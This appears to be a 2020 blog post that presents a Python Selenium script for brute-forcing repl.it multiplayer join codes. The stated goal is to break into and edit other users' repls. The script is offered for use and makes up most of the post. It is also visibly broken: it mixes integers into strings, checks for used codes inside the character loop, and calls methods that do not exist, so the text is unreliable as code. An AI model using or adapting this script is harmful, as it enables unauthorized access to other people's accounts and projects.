---
title: "How to Hack Into a Repl"
catalog: true
toc_nav_num: true
date: 04-20-2020 02:08:00
subtitle: Hack into people repls and edit them as if they are multiplayer!
header-img: "/img/article_header/article_header.png"
tags:
- Repl.it
- Hack
- hehe
- Hack repls
- AwesomeAg
catagories:
- hehe
- post
- AwesomeAg
- Hacks
- Repl.it
updateDate: 04-20-2020 3:00:00
top: 1

---
There is a website called [repl.it](https://repl.it) which is a inline compiler for coding. It supports many languages and is used by many people around the USA
There is a feature called multiplayer, where people can access repls as a group without forking (copying) them. This is used through a url with a code, like repl.it/join/an8digitcode-ausername or repl.it/join/h3fg824l-heheman
To get to the point, you can hack into other peoples repls by getting their username, and using a python code to generate random codes and going to a url with the code inserted, until it does not return a 404 error. We will use a simple method to check the 404 by checking if "404" or "not found" is in the title. **Important:** Be sure to [install the selenium webdriver here](https://chromedriver.storage.googleapis.com/index.html?path=83.0.4103.14/) before you run this code. Also, this code should preferably be run on replit, so upload the file there.
The code should match the following:
```python
# import all the modules
import random
from selenium import webdriver
#all the characters possible.
characters=[1,2,3,4,5,6,7,8,9,0,"a","b",'c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
#make a list so codes aren't used more than once
usedcodes=[]
#set the username
username = "usernamehere"
#start the loop
while True:
  #preset the code as nothing
  code=""
  #now to add characters to the code string
  for i in range(8):
    code= str(code+random.choice(characters))
    #make sure it's not already used
    if code not in usedcodes:
      #add the code
      usedcodes.append(code)
      #set url
      url = "https://repl.it/join/"+code+"-"+username
      #set driver
      driver = webdriver.Chrome("./chromedriver")
      #go to url
      website=driver.get(url)
      # check for 404
      if "404" in website.getTitle() or "not found" in website.getTitle().lower:
        pass
      else:
        #print success
        print("code seems to work! " + url)
        break
```
After running this code, you should be able to access one of the persons repls. Sadly, this does not work for finding specific repls, but you can keep running the code multiple times until you're done.